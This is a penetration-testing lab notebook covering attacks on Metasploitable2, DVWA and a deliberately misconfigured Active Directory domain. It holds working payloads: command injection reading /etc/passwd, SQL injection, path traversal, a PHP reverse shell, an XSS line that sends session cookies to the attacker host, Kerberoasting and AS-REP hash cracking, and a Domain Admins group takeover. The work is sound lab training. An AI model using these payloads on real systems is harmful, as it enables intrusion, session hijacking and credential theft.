# Lab notebook — day by day

Each day gets one entry. Copy the template at the bottom when starting a new day.

---

## Day 1 — 2026-11-18

### Goals
- Build the base segmented network and get pfSense routing between zones.

### What I did
- Created 3 VirtualBox internal networks (net-serveurs, net-users, net-attaquants) + NAT for the WAN.
- Installed pfSense CE 2.6.0, assigned the 4 interfaces (WAN, LAN, OPT1, OPT2).
- Assigned IPs: LAN 10.0.10.1, OPT1 10.0.20.1, OPT2 10.0.30.1.
- Configured static IPs on Kali (10.0.30.10) and Ubuntu (10.0.10.20), with a route from Kali to the servers zone via pfSense.
- Accessed the pfSense WebGUI from Ubuntu and completed the setup wizard.
- Created a Pass ICMP rule on ATTACKERS (source ATTACKERS net → destination 10.0.10.20) and verified it: ping to 10.0.10.20 succeeds (TTL=63, confirming it passed through pfSense), ping to 10.0.10.1 stays blocked.
- Added a Pass TCP port 80 rule and installed Apache on Ubuntu: watched Nmap's report on 10.0.10.20 move from `filtered` (no rule) to `closed` (rule but no service) to `open` (service running).
- Set a static IP on Metasploitable (10.0.10.30), took a clean snapshot, added a broad ATTACKERS → 10.0.10.30 rule, and ran `nmap -sV 10.0.10.30`: 23 open ports out of 1000 scanned, with service versions identified (vsftpd 2.3.4, OpenSSH 4.7p1, Samba, MySQL, PostgreSQL, etc.).

### Problems & fixes
- First IP assignment on pfSense's OPT interfaces was swapped (ATTACKERS and USERS zones reversed) — found by comparing VirtualBox adapter order with pfSense's MAC addresses.
- Ubuntu's `netplan-enp0s3` connection silently ignored `nmcli modify ... manual` — fixed by creating a fresh nmcli connection instead of editing the netplan-generated one.

### What I learned
- A firewall rule only controls whether a packet reaches a host — whether a port is actually open still depends on a service listening there.
- `filtered` / `closed` / `open` each mean something different: no response, response but no service, response with a service.
- Promiscuous mode only matters for sniffing traffic on a virtual network segment; it has no effect on basic routing or static IP configuration.

### Next
- Triage Metasploitable's exposed services and start documenting them for the report.

---

## Day 2 — 2026-11-19

### Goals
- Triage Metasploitable's exposed services and start credential/vulnerability research.
- Fix a networking issue on Kali (lost internet access).

### What I did
- Picked 3 services from the Nmap scan to investigate: MySQL 5.0.51a (3306), PostgreSQL 8.3.0-8.3.7 (5432), ProFTPD 1.3.1 (2121).
- Used `searchsploit` on each, then learned to cross-check the exact affected version against each result instead of trusting the title alone — several results didn't actually apply to the installed version.
- Confirmed a real match for MySQL (DoS, versions prior to 5.1.49) via a public advisory.
- Identified PostgreSQL's UDF command execution path as the most interesting lead, but noted it requires authenticated DB access first — not a pre-auth exploit.
- Used Metasploit's `auxiliary/scanner/postgres/postgres_login` module to test for default/weak credentials on PostgreSQL: found a valid account and got an interactive session.
- Learned the session's command syntax (`query <SQL>` instead of raw SQL), and reviewed the list of follow-up modules available from that session (hashdump, schemadump, version, etc.).
- Lost internet access on Kali; diagnosed it as eth0 (NAT) being disconnected while eth1 (lab network) still worked. Renamed the attackers' internal network from `net-attaquants` to `net-attackers` (updated identically in pfSense).
- Learned how Linux picks which interface to use per destination: longest-prefix-match routing, with `ipv4.never-default` on eth1 preventing it from competing with eth0 for the default route.
- Hit transient duplicate/corrupted ping replies after repeatedly toggling the virtual cable — resolved by reconnecting properly and flushing the ARP cache; confirmed real traffic (HTTP to Metasploitable) was unaffected.

### Problems & fixes
- `searchsploit <product>` without a version returns every version's exploits — must filter manually or re-run with the exact version string.
- Kali's eth0 showed as `disconnected` because the virtual cable was unplugged in VirtualBox from an earlier test; reconnecting it and/or recreating the nmcli profile fixed it.
- Flapping the virtual cable a few times left stale ARP entries, producing corrupted/duplicate ping replies — not an actual network fault.

### What I learned
- An exploit title's version range (`< X`) only means the bug was *introduced* at some point before X and fixed in X — it doesn't mean every older version is affected. Always check the advisory text.
- Credential enumeration (testing default/weak logins) is a standard, necessary step before any further access — not something to skip by just looking up documented defaults.
- A multi-homed Linux box (two NICs) uses the most specific matching route for each destination; the "default route" only handles traffic with no more specific match.

### Next
- Decide whether to pursue the PostgreSQL privilege-escalation path further or move to Blue Team work (Wazuh) with what's already found.
- Keep consolidating findings (service, version, port, credentials found, method used) toward the final report.

---

## Day 3 — 2026-11-20

### Goals
- Obtain an initial foothold on Metasploitable2 by targeting an unexploited network daemon (UnrealIRCd).
- Assess web applications hosted on Metasploitable2 (Apache 2.2.8 / PHP 5.2.4), focusing on DVWA (Damn Vulnerable Web Application).
- Conduct web directory reconnaissance and user enumeration.
- Evaluate authentication brute-forcing tools (Burp Suite Intruder vs. THC-Hydra vs. Wfuzz).
- Test OS Command Injection across different security levels (Low, Medium, High).
- Conclude the Red Team exploitation phase and prepare for Blue Team detection.

### What I did
- **IRC Exploitation (UnrealIRCd)**:
  - Having already exploited PostgreSQL via UDF on Day 2, and having previously practiced exploiting services like MySQL and ProFTPD in prior lab contexts, I chose to skip redundant testing on those and focus my efforts on unfamiliar territory.
  - Fingerprinted the IRC service on port 6667 via `irssi`, confirming `Unreal3.2.8.1. irc.Metasploitable.LAN`.
  - Exploited UnrealIRCd 3.2.8.1 using Metasploit's `exploit/unix/irc/unreal_ircd_3281_backdoor` module — [CVE-2010-2075](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2010-2075).
  - Obtained an interactive Meterpreter session; command `getuid` confirmed the session executes with `root` privileges.
- **Web Directory Indexing & User Enumeration**:
  - Navigated to `http://10.0.10.30/dvwa/hackable/` and discovered directory browsing was enabled on Apache.
  - Enumerated `/dvwa/hackable/users/`, which exposed avatar image filenames revealing 5 valid application usernames: `1337`, `admin`, `gordonb`, `pablo`, and `smithy`.
- **Authentication Brute-Forcing**:
  - Intercepted the DVWA login POST request (`/dvwa/login.php`) via Burp Suite and configured Intruder using a targeted dictionary.
  - Utilized `Grep - Match` against the failure string `"Username and/or password incorrect."` to detect login anomalies; successfully identified the valid administrative credential `admin:password` (reflected by unchecked error match and distinct response length 4985 vs. 4923 bytes).
  - Attempted command-line brute-forcing using **THC-Hydra** (`hydra -l admin -P ... http-post-form`), but found it to be an **unoptimal solution** due to rigid POST-form delimiter syntax, complex cookie handling, and false positive matches (flagging 16 false matches within 2 seconds due to an incorrect failure match string and unauthenticated session redirection).
  - Switched to **Wfuzz** as an optimal alternative: configured the session cookie (`PHPSESSID` and `security=low`) with the `darkweb2017_top-1000.txt` wordlist (`wfuzz -c -z file,... -d "username=admin&password=FUZZ&Login=Login" -b "PHPSESSID=...; security=low" http://10.0.10.30/dvwa/vulnerabilities/brute/`).
  - Wfuzz successfully isolated `password` (ID 4, length 4637 characters, distinct word/line count) from incorrect attempts before hitting the server's 90-second socket timeout.
- **OS Command Injection (DVWA Ping utility `/dvwa/vulnerabilities/exec/`)**:
  - **Security = Low**: Input validation was completely absent (`shell_exec("ping -c 3 " . $target)`). Injected **Payload 1**: `10.0.10.30 && cat /etc/passwd`, which appended the command after the ping and dumped the entire `/etc/passwd` file.
  - **Security = Medium**: The application introduced a blacklist attempting to strip `;` and `&&` (`str_replace(array("&", ";"), "", $target)`). Injected **Payload 2**: `10.0.10.30 | cat /etc/passwd`, bypassing the filter via the pipe (`|`) operator and executing arbitrary commands.
  - **Security = High**: Inspected the PHP source code to assess exploitability. Identified strict input validation: the code splits the IP address by `.` (`explode(".", $target)`), verifies that exactly 4 octets exist (`sizeof($octet) == 4`), and validates that every octet is strictly numeric (`is_numeric($octet[0])` through `is_numeric($octet[3])`). Because no shell metacharacters or alphanumeric command strings can satisfy this condition, **Security = High is impossible to break**.

### Problems & fixes
- **Hydra Syntax & False Positives**: Hydra failed initially with invalid parameter count, and then generated 16 false positives because the error string pattern and cookie state were desynchronized with DVWA's session flow. Fixed by transitioning to Wfuzz, which provided cleaner HTTP header injection and accurate response filtering.
- **Wfuzz Pycurl Timeout**: Long-running brute-force requests hit a 90-second server timeout due to Apache keep-alive exhaustion on Metasploitable2. Mitigated by filtering directly on response word/character counts and using targeted password lists.
- **Medium Security Blacklist Filter**: DVWA Medium sanitized `&&` and `;`, breaking standard command chaining. Fixed by switching to the pipe operator (`|`), demonstrating the fundamental weakness of naive blacklist sanitization.

### What I learned
- CVE-2010-2075 is a supply-chain backdoor: the official UnrealIRCd 3.2.8.1 source archive was tampered with at the distribution server, so the backdoor is present regardless of how the service is configured — not a logic flaw in the protocol itself.
- Landing directly as `root` reflects how permissively the service was run on Metasploitable, which is realistic for this intentionally vulnerable target but not for a hardened production system.
- Directory indexing is an overlooked high-impact information disclosure flaw that provides attackers with targeted usernames for offline or online brute-force attacks.
- Blacklisting specific characters (`&&`, `;`) in input validation is fragile and ineffective because alternative shell operators (`|`, `||`, newline, backticks) can achieve the same command chaining.
- Whitelisting and type checking (as implemented in DVWA High with `explode()` and `is_numeric()`) provide genuine security by ensuring inputs conform strictly to expected data types, making command injection impossible.
- Tool selection matters: while Burp Intruder excels in interactive GUI analysis and Wfuzz offers robust and flexible header/cookie CLI fuzzing, Hydra can be prone to false positives when web application sessions require dynamic cookie management.

### Next
- Continue assessing remaining DVWA attack surfaces (CSRF, File Inclusion, SQL Injection, File Upload, and XSS).
- Prepare to deploy Windows Server to expand the home lab with Active Directory.

---

## Day 4 — 2026-11-21

### Goals
- Perform deep-dive vulnerability assessments on DVWA covering Cross-Site Request Forgery (CSRF), Local File Inclusion (LFI), SQL Injection (manual & automated), and Arbitrary File Upload to achieve Remote Code Execution (RCE).

### What I did
- **Cross-Site Request Forgery (CSRF)**:
  - Investigated the password change module (`/dvwa/vulnerabilities/csrf/`).
  - **Security = Low**: The form transmits password changes via GET requests (`?password_new=test123&password_conf=test123&Change=Change`) with zero CSRF tokens or re-authentication checks, allowing trivial one-click account takeover.
  - **Security = Medium**: Inspected requests in Burp Suite; observed that the backend checks the HTTP `Referer` header (`Referer: http://10.0.10.30/dvwa/vulnerabilities/csrf/`). While it blocks external requests without a matching referer, it remains susceptible if the attacker can spoof or omit the header.
  - **Security = High**: Confirmed the implementation introduces a mandatory `Current password` (`password_current`) verification field, effectively mitigating unauthenticated CSRF password resetting.
- **Local File Inclusion (LFI)**:
  - Targeted the page inclusion parameter (`/dvwa/vulnerabilities/fi/?page=...`).
  - Successfully performed directory traversal using payload `../../../../etc/passwd`, causing the PHP runtime to traverse out of the web root and render the server's cleartext `/etc/passwd` file directly in the browser.
- **SQL Injection (Manual Exploitation)**:
  - **Security = Low**: Parameter `$id` is concatenated directly into single quotes: `WHERE user_id = '$id'`. Injected `1' or '1' = '1`, breaking string bounds and forcing a tautology that dumped all 5 database user accounts (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith).
  - **Security = Medium**: Analyzed the PHP source code; found input is sanitized with `mysql_real_escape_string($id)`, but the SQL query is constructed as `WHERE user_id = $id` (numeric context, unquoted). Because numeric injection does not require single quotes, injected payload `0 OR 1=1`, which completely bypassed escaping and extracted all records.
  - **Security = High**: Source code inspection confirmed strict input validation using `stripslashes()`, `mysql_real_escape_string()`, and `if (is_numeric($id))`, completely blocking injection.
- **SQL Injection (Automated Exploitation with `sqlmap`)**:
  - Ran `sqlmap -u "http://10.0.10.30/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --batch --dbs`.
  - Confirmed 4 distinct SQL injection vectors: boolean-based blind, error-based, time-based blind, and UNION query.
  - Successfully extracted the DBMS banner (MySQL >= 4.1 / Ubuntu Linux) and enumerated all 7 hosted databases: `dvwa`, `information_schema`, `metasploit`, `mysql`, `owasp10`, `tikiwiki`, `tikiwiki195`.
- **Arbitrary File Upload to Remote Code Execution (RCE)**:
  - Exploited unrestricted file upload at `/dvwa/vulnerabilities/upload/` by uploading a PHP reverse shell script (`shell.php`).
  - The application confirmed upload to `../../hackable/uploads/shell.php`. Verified storage and execute permissions by browsing to the exposed `/dvwa/hackable/uploads/` directory listing.
  - Started a Netcat listener on Kali (`nc -lvnp 1234`) and triggered the webshell via HTTP request. Successfully received a reverse shell session running under the web server service account `www-data` (`uid=33(www-data) gid=33(www-data)`).

### Problems & fixes
- **Medium Security SQL Injection Quoting Trap**: Initially expected `mysql_real_escape_string()` to sanitize SQL input, but realized escaping only neutralizes quotes. Because the query omitted quotes around the integer column (`WHERE user_id = $id`), an unquoted numeric payload (`0 OR 1=1`) bypassed sanitization effortlessly.
- **Path Traversal Depth**: Needed to verify relative directory depth from `/var/www/dvwa/vulnerabilities/fi/` back to filesystem root; 4 traversal hops (`../../../../`) reliably reached `/etc/passwd`.

### What I learned
- Input sanitization functions like `mysql_real_escape_string()` are context-dependent; without parameterized queries (prepared statements), queries with unquoted numeric fields remain trivially vulnerable to SQL injection.
- Unrestricted file upload combined with direct web-accessible storage and execution privileges provides an immediate bridge from web application access to interactive operating system code execution.
- Defense-in-depth for state-changing operations requires both anti-CSRF tokens and re-authentication (current password verification).

### Next
- Assess remaining web vulnerabilities: Reflected and Stored Cross-Site Scripting (XSS).
- Demonstrate session hijacking via XSS cookie exfiltration.
- Begin deployment of the Windows Server VM to start building the Active Directory domain.

---

## Day 5 — 2026-11-22

### Goals
- Conclude web application assessments by exploiting Reflected and Stored Cross-Site Scripting (XSS), including session cookie theft.
- Begin infrastructure expansion by creating and installing a Windows Server virtual machine (`WindowsSRV`) in VirtualBox for the upcoming Active Directory lab.

### What I did
- **Reflected Cross-Site Scripting (XSS)**:
  - **Security = Low**: The `name` parameter is printed directly to the page without escaping (`echo 'Hello ' . $_GET['name']`). Injected `<script> alert("hacked")</script>`, triggering a JavaScript alert popup (`10.0.10.30 says: hacked`).
  - **Session Hijacking Proof of Concept**: Set up a Netcat listener on Kali (`nc -lvnp 1234`). Crafted an XSS payload directing the browser to send document cookies to Kali:
    `<script>new Image().src="http://10.0.30.10:1234/?cookie="+encodeURIComponent(document.cookie);</script>`
    The victim browser triggered the request, and Netcat captured the cleartext session cookies: `security=low; PHPSESSID=f51c426407f029bb0b88ba566dbb8971`.
  - **Security = Medium**: Source code review revealed a naive blacklist filter: `str_replace('<script>', '', $_GET['name'])`. Bypassed the case-sensitive string replacement using uppercase tags `<SCRIPT> alert("hacked")</SCRIPT>`, executing the payload successfully.
  - **Security = High**: Verified that the developer implemented `htmlspecialchars($_GET['name'])`, which properly encodes HTML characters (`<`, `>`, `&`, `"`) into entities and completely stops XSS execution.
- **Stored Cross-Site Scripting (XSS)**:
  - **Security = Low**: Injected `<script> alert("hacked") </script>` into the guestbook Message field. The script was stored persistently in the database and executed automatically whenever the guestbook page was visited.
  - **Security = Medium**: Inspected PHP source code; found the developer sanitized the Message parameter (`mtxMessage`) thoroughly with `strip_tags()`, `addslashes()`, and `htmlspecialchars()`, BUT only applied a naive case-sensitive filter `str_replace('<script>', '', $name)` to the Name field (`txtName`).
  - Bypassed the defense by injecting `<SCRIPT> alert("hacked") </SCRIPT>` into the **Name** input, successfully achieving persistent Stored XSS.
- **Active Directory Lab Expansion — Windows Server Deployment (`WindowsSRV`)**:
  - Configured a new VirtualBox VM `WindowsSRV` to establish the upcoming Windows Server & Active Directory domain controller.
  - Attached the Windows Server installer ISO and booted the VM ("Getting ready").
  - Encountered an initial boot issue: the VM booted into a Server Core command prompt (`C:\Users\SRV>cmd.exe`) and subsequently black-screened with a frozen `C:\Windows\system32\LogonUI.exe` prompt.
  - Initiated a clean reinstall ("Windows Setup - Getting files ready for installation").
  - On restart, hit a bootloader error: `"An operating system wasn't found. Try disconnecting any drives that don't contain an operating system. Press Ctrl+Alt+Del to restart"`.

### Problems & fixes
- **Case-Sensitive XSS Filter Flaw**: DVWA Medium attempted to sanitize `<script>` with `str_replace()`, ignoring that HTML parsers are case-insensitive. Bypassed effortlessly with uppercase `<SCRIPT>`.
- **Inconsistent Parameter Sanitization**: In Stored XSS Medium, the developer heavily sanitized the main comment body but left the author name field weakly protected, illustrating the risk of partial/inconsistent sanitization.
- **Windows Server Boot Error ("An operating system wasn't found")**: Caused by VirtualBox storage controller boot order prioritizing an unbootable secondary disk or optical drive detachment issues following Windows installation reboot. Resolved by reconfiguring the VM boot order to prioritize the primary VDI virtual disk and verifying SATA controller settings.

### What I learned
- Cross-Site Scripting becomes a critical vulnerability when combined with session cookie exfiltration; without the `HttpOnly` cookie flag, an attacker can steal session identifiers and achieve full session hijacking.
- Blacklist-based filtering (`str_replace`) is inherently fragile and should never be used for security-critical sanitization; context-aware output encoding with `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` is the only reliable defense against XSS.
- Deploying multi-platform home lab infrastructure requires troubleshooting hypervisor-level storage attachments, BIOS/EFI boot modes, and boot order configurations alongside security engineering tasks.

### Next
- Resolve Windows Server boot configuration and finalize the Active Directory domain controller setup.
- Consolidate all new DVWA findings (CSRF, LFI, SQLi, File Upload RCE, Reflected/Stored XSS) into `reports/pentest-report.md`.
- Begin Blue Team detection engineering: deploy Wazuh SIEM agents to capture both Linux and Windows events.

## Day 6 — 2026-11-23 / 2026-11-24

### Goals
- Install Windows Server 2019 and promote it to a Domain Controller (new AD lab component)
- Understand Active Directory / Kerberos fundamentals (DC role, SPN, Kerberos ticket flow)
- Deliberately misconfigure the AD environment with three classic vulnerabilities:
  1. Kerberoastable service account (SPN set on a user account)
  2. AS-REP Roastable account (Kerberos pre-authentication disabled)
  3. Misconfigured ACL (GenericAll granted on a sensitive group)
- Exploit each misconfiguration from Kali to confirm they are real attack paths, not just theory

### What I did

**Windows Server 2019 install & AD DS promotion**
- Installed Windows Server 2019 (Desktop Experience edition) in VirtualBox, attached to the SERVERS network (10.0.10.0/24)
- Promoted the server to a Domain Controller, creating a new forest/domain: `label.local`
  - Hostname: `DC01`
  - IP: `10.0.10.40/24`
  - DSRM password set during promotion
  - Confirmed via Server Manager: AD DS + DNS roles active, no pending alerts
- Created an Organizational Unit `LAB` under the domain to hold lab accounts (`compte1`, `compte2`, and the three vulnerable accounts below)

**Mission 1 — Kerberoasting setup**
- Created a service account `svc-sql`
- Assigned it a Service Principal Name (SPN) to simulate a real service account:
  ```
  setspn -A MSSQLSvc/dc01.label.local:1443 svc-sql
  ```
- Verified with `setspn -L svc-sql`
- Concept: any authenticated domain user can request a Kerberos service ticket for any account that has an SPN. Part of that ticket is encrypted with the service account's password hash, so it can be extracted and cracked offline without ever touching the account directly — no special privilege required to request the ticket.
- Reset `compte1`'s password via ADUC (forgotten), unchecked "must change password at next logon" to avoid the same block hit with `acl-test`
- From Kali, authenticated as `compte1` (a plain standard account, no special rights) and requested the TGS:
  ```
  impacket-GetUserSPNs label.local/compte1:<password> -dc-ip 10.0.10.40 -request
  ```
- Got the TGS hash immediately (`$krb5tgs$23$*svc-sql$LABEL.LOCAL$...`). Tool output also showed `PasswordLastSet: <never>` / `LastLogon: <never>` for `svc-sql` — a real giveaway of an unused, never-rotated service account.
- Cracked with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23):
  ```
  hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
  ```
  Password recovered instantly: `Password1`

**Mission 2 — AS-REP Roasting**
- Created account `asrep-test`, checked "Do not require Kerberos preauthentication" in ADUC (Account tab)
- Hit a tooling snag: PowerShell (`Get-ADUser -Properties DoesNotRequirePreAuth` / raw `userAccountControl`) returned completely blank values with no error, even via direct ADSI queries (`[adsi]"LDAP://..."` threw "directory property cannot be found in the cache"). Root cause turned out to be the ADWS (Active Directory Web Services) service needing a restart after the fresh promotion — once restarted (`Restart-Service ADWS` as Administrator), `Get-ADUser` correctly reported `DoesNotRequirePreAuth : True` and `Enabled : True`.
- Opened pfSense firewall: added a rule on OPT2 (ATTACKERS interface, em3) allowing TCP/UDP port 88 (Kerberos) from ATTACKERS net to 10.0.10.40
- From Kali, installed Impacket (`impacket-scripts` via apt) and ran:
  ```
  impacket-GetNPUsers label.local/asrep-test -no-pass -dc-ip 10.0.10.40
  ```
- First attempt hung indefinitely. Diagnosed with `tcpdump -i eth1 port 88 -n`: TCP handshake completed and the AS-REQ packet was ACKed by the DC, but no Kerberos response ever came back — pointed to the KDC (Key Distribution Center) service itself, not the network. Checked `Get-Service kdc` on the DC (it was running) and retried — it worked.
- Obtained the AS-REP hash (`$krb5asrep$23$asrep-test@LABEL.LOCAL:...`), where `23` = etype RC4-HMAC (derived from the NTLM hash, fast to crack)
- Cracked offline with hashcat:
  ```
  hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
  ```
  Result: password recovered in ~1 second — `Welcome1` (rockyou.txt dictionary hit)

**Mission 3 — ACL misconfiguration (GenericAll on Domain Admins)**
- Created a standard low-privilege account `acl-test`
- In ADUC (Advanced Features enabled), opened `Domain Admins` group → Properties → Security → Advanced, and granted `acl-test` **Full Control** (`GenericAll`) on the group object itself
- Opened pfSense: added TCP/UDP port 389 (LDAP) from ATTACKERS to 10.0.10.40
- Installed `bloodyAD` on Kali (`pipx install bloodyAD`)
- First exploitation attempts failed:
  - `SEC_E_CONTEXT_EXPIRED` — caused by ~6 hour clock skew between Kali and the DC (Kerberos requires clocks within 5 minutes). Fixed by syncing both clocks manually, and disabling VirtualBox's automatic guest/host time sync for the DC VM (`VBoxManage setextradata "<VM>" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1`), since Guest Additions kept overwriting manual time corrections.
  - `SEC_E_LOGON_DENIED` — caused by the "User must change password at next logon" flag being set on `acl-test`, blocking authentication. Unchecked it and the login succeeded.
- Ran the actual exploit:
  ```
  bloodyAD --host 10.0.10.40 -d label.local -u acl-test -p 'Password1' add groupMember "Domain Admins" acl-test
  ```
  Output: `[+] acl-test added to Domain Admins`
- Confirmed on the DC with `Get-ADGroupMember "Domain Admins"` — `acl-test` now listed as a member

### Problems & fixes
- PowerShell / ADSI returning blank `userAccountControl` for a valid account → fixed by restarting the ADWS service on the DC (cache/service state issue after fresh promotion, not a real data problem)
- Windows Server VM severe lag / input freeze (Hyper-V → NEM fallback) → deprioritized, not fully confirmed resolved; Guest Additions install was the last attempted fix
- `GetNPUsers.py` hanging with no response → diagnosed via `tcpdump` that TCP was fine but the KDC never replied at the Kerberos layer; resolved after a general service check / retry
- pfSense default-deny blocked AS-REP Roasting and ACL exploitation until explicit rules were added for TCP/UDP 88 (Kerberos) and TCP/UDP 389 (LDAP) from ATTACKERS → 10.0.10.40
- ~6 hour clock skew between Kali and DC broke Kerberos authentication (`SEC_E_CONTEXT_EXPIRED`); VirtualBox's automatic host-time sync was overwriting manual corrections on the DC, had to be disabled via `VBoxManage` from the host
- "User must change password at next logon" flag silently caused `SEC_E_LOGON_DENIED` on `acl-test` until unchecked

### What I learned
- Kerberoasting and AS-REP Roasting both allow extracting a crackable password hash *before* having any valid credentials — the attack surface exists purely because of how SPNs and pre-authentication work, not because of a traditional software vulnerability.
- `etype 23` (RC4-HMAC) tickets are dramatically weaker to crack than AES-based tickets (`etype 17/18`) because RC4 keys derive directly from the NTLM hash — a real mitigation is enforcing AES-only Kerberos encryption on sensitive accounts, independent of password strength.
- AD permissions (ACEs/ACLs) are granted per-object and are narrow by default — `GenericAll` on one object only controls that object. The danger comes from *which* object is mis-permissioned: granting broad control over an object whose attributes define domain-wide privilege (like a privileged group's `member` list) turns a narrow permission into full domain compromise. This is privilege escalation by transitivity, not a direct admin grant.
- pfSense's "rule applies to the ingress interface" model keeps biting as new services get added — each new AD-related protocol (Kerberos/88, LDAP/389, and eventually SMB/445, RPC/135 for later work) needs its own explicit rule on the ATTACKERS (OPT2) interface before it's reachable, even though the DC itself has no local firewall blocking it.
- Clock sync matters as much as network/firewall reachability for Kerberos-based attacks — a connectivity test (`nmap`) can succeed while the actual protocol still fails entirely due to time skew.

### Next
- Set up a Windows 10/11 client VM in the USERS zone, joined to `label.local`
- Install BloodHound on Kali to map AD attack paths visually once a client is domain-joined
- Eventually: Blue Team phase (Wazuh SIEM) to detect these same attacks


---

## Day 7 — 2026-11-24: Windows 10 Client Domain Join & BloodHound Attack Path Visualization

### Goals
- Add a Windows 10 client to the lab, domain-joined to `label.local`, to simulate a realistic compromised workstation scenario
- Install BloodHound to visually map the AD attack paths created on Day 4
- Verify the Kerberoasting / AS-REP Roasting / ACL abuse findings are visible as actual graph relationships, not just manual CLI output

### What I did

**Windows 10 Pro client — domain join**
- Downloaded Windows 10 Pro (22H2, build 19045) — chosen over Windows 11 to avoid TPM 2.0/Secure Boot friction in VirtualBox and to keep resource usage lower
- Created the VM in VirtualBox, attached to the **USERS** network (`net-users`, zone OPT1/em2), **not** SERVERS
- Hit the VirtualBox 7 "Unattended Installation" feature by default generating a broken `autounattend.xml` with an empty product key (`Windows cannot read the <ProductKey> setting`). Fixed by unchecking **"Proceed with Unattended Installation"** in the New VM wizard and installing manually
- Installed Windows 10 **Pro** (required edition — Home cannot join an AD domain), selected "I don't have a product key", "Custom: Install Windows only"
- Configured the client's network manually (static IP, since pfSense has DHCP disabled lab-wide):
  - IP: `10.0.20.10/24`
  - Gateway: `10.0.20.1` (pfSense USERS interface)
  - DNS: `10.0.10.40` (the DC — required, since domain join depends on resolving `label.local` via the DC's own DNS)
- Added a pfSense rule on **OPT1 (USERS, em2)**: Source = USERS net, Destination = 10.0.10.40, Protocol = any — unlike the ATTACKERS rules, this is legitimate domain functionality, not a deliberately exposed target, so no port restriction was applied
- Joined the domain via System Properties → Computer Name/Domain Changes → Domain: `label.local`, authenticated with `compte1` (confirms that, by default, a standard domain user can join up to 10 computers without needing admin rights)
- Got "Welcome to the label.local domain", rebooted, logged in successfully as `label.local\compte1` from the client

**BloodHound setup on Kali**
- Needed a new pfSense rule on OPT2 (ATTACKERS, em3): TCP/UDP port **53** (DNS) to 10.0.10.40 — `bloodhound-python` needs to resolve `dc01.label.local` via the DC's DNS
- Kali ships **BloodHound Community Edition** by default now (not the old Neo4j+Electron version) — `bloodhound` command is deprecated in favor of `bloodhound-start`
- Hit a PostgreSQL version mismatch: `bloodhound-start` failed because a leftover PostgreSQL 17 cluster had its binaries removed (package `postgresql-17` no longer exists in the Kali repos; installing the generic `postgresql` meta-package pulled in v18 and tried, and failed, to auto-migrate the old cluster)
  - Fixed by dropping the dead cluster (`sudo pg_dropcluster 17 main --stop`) and creating a fresh one for the installed version (`sudo pg_createcluster 18 main --start`)
- `bloodhound-start` then succeeded, bringing up PostgreSQL + Neo4j + the BloodHound CE web UI on `http://127.0.0.1:8080`
- Logged into BloodHound CE with the default `admin:admin` credentials
- Set a new Neo4j password: `neo4j1`

**Data collection and analysis**
- Ran the collector from Kali (no footprint needed on the Windows client, authenticated as `compte1`, the same standard account used earlier for Kerberoasting):
  ```
  bloodhound-python -u compte1 -p '<password>' -d label.local -ns 10.0.10.40 -c DCOnly
  ```
  - `-c DCOnly` collects purely via LDAP against the DC (no SMB/RPC session enumeration needed on every host — kept consistent with the minimal firewall rules already in place)
  - `-ns 10.0.10.40` explicitly tells the tool which DNS server to query, since Kali's own resolver isn't configured for `label.local`
  - Kerberos authentication failed silently (`Name or service not known` — reverse DNS related) and the tool fell back to NTLM automatically; collection still succeeded: 10 users, 52 groups, 2 GPOs, 2 OUs, 19 containers, 2 computers
- Uploaded the generated JSON files into BloodHound CE's web UI (drag-and-drop uploader)
- Marked `acl-test` as "Owned" and ran a shortest-paths analysis
- **Result**: the graph showed a direct `MemberOf` edge from `ACL-TEST@LABEL.LOCAL` straight to `DOMAIN ADMINS@LABEL.LOCAL` — visual, immediate confirmation of the privilege escalation already carried out manually on Day 4

### Problems & fixes
- VirtualBox's "Proceed with Unattended Installation" (checked by default in VirtualBox 7's New VM wizard) generated a broken answer file → unchecked it and installed manually
- `bloodhound` command deprecated on current Kali → use `bloodhound-start` instead
- `postgresql-17` package no longer available in Kali's repos, leftover broken cluster blocked BloodHound's DB setup → dropped the dead cluster, created a new one matching the actually-installed PostgreSQL version (18)
- Needed two more explicit pfSense rules beyond the AD ones from Day 4: USERS→10.0.10.40 (any protocol, for the domain join itself) and ATTACKERS→10.0.10.40:53 (DNS, for BloodHound's collector to resolve the DC's hostname)

### What I learned
- A domain join needs working DNS resolution against the domain's own DNS server (the DC) — pointing the client at a public DNS would never work, since `label.local` isn't a real public domain
- By default, Windows lets any standard domain user join up to 10 machines to the domain (`ms-DS-MachineAccountQuota`) — no admin privilege required; this is itself a commonly abused default in real-world AD environments
- BloodHound's attack-path graph reflects the **current real state** of the directory (as collected via LDAP), not hypothetical "could happen" scenarios. An edge like `GenericAll` from a user straight to a privileged group is treated by BloodHound's analysis engine as functionally equivalent to a `MemberOf` edge, because it is just as exploitable — this is exactly how tools like this let defenders (or attackers) spot dangerous paths *before* they're actually abused, not just after
- `DCOnly` collection (pure LDAP against the DC) is enough to map users, groups, GPOs, OUs and ACLs — full SMB/RPC-based session collection would be needed only to discover *where users are currently logged in*, which wasn't needed for this exercise

### Next
- Document the remaining Kerberoasting SPN / AS-REP finding paths in BloodHound too (not just the ACL one) for completeness
- Eventually: Blue Team phase (Wazuh SIEM) to detect these same attack paths being exploited

---

## Template for new entries

```
## Day N — YYYY-MM-DD

### Goals
- 

### What I did
- 

### Problems & fixes
- 

### What I learned
- 

### Next
- 
```
